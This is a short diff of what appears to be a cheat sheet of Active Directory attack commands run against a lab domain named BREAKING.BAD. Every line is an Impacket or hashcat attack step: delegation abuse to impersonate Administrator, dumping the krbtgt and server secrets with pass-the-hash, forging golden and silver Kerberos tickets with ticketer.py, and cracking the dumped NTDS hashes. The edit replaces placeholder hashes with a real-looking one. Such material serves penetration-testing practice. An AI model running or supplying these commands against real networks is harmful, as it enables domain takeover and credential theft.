@@ -137,8 +137,8 @@ getST.py -spn CIFS/SV01@BREAKING.BAD -impersonate Administrator -dc-ip 192.168.5
 getST.py -spn RPCSS/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 'BREAKING.BAD/SHUTDOWN$:123soleil'
 secretsdump -just-dc-user krbtgt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 'BREAKING.BAD/Administrator@dc01.breaking.bad'
 lookupsid.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 'BREAKING.BAD/Administrator@dc01.breaking.bad' 0
-ticketer.py -nthash 0123456789krbtgtnthash0123456789 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD randomuser
-ticketer.py -nthash 01234567890sv01nthash01234567890 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD -spn HOST/SV01.BREAKING.BAD randomuser
+ticketer.py -nthash c1c635aa12ae60b7fe39e28456a7bac6 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD randomuser
+ticketer.py -nthash c1c635aa12ae60b7fe39e28456a7bac6 -spn HOST/SV01.BREAKING.BAD -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD randomuser
 export KRB5CCNAME=randomuser.ccache
 secretsdump -k SV01.BREAKING.BAD
 hashcat --status --hash-type 1000 --attack-mode 0 --username BREAKING.BAD.ntds `fzf-wordlists`
